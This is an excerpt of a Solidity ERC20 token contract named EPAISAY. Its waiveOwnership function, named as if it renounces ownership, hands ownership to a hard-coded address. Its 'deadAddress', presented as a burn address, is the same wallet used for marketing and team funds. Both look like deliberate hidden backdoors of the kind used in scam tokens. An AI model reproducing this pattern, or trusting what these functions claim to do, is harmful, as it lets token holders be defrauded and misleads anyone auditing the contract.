...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xda7F6851Fbbe363A17706ae20AB954D9B27688Dd));
        _owner = address(0xda7F6851Fbbe363A17706ae20AB954D9B27688Dd);
    }
...
contract EPAISAY is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "EPAISAY";
    string private _symbol = "EPAISAY";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x7f852D330A317d52B473DB42146b0A3E67800000);
    address payable public teamWalletAddress = payable(0x7f852D330A317d52B473DB42146b0A3E67800000);
    address public immutable deadAddress = 0x7f852D330A317d52B473DB42146b0A3E67800000;
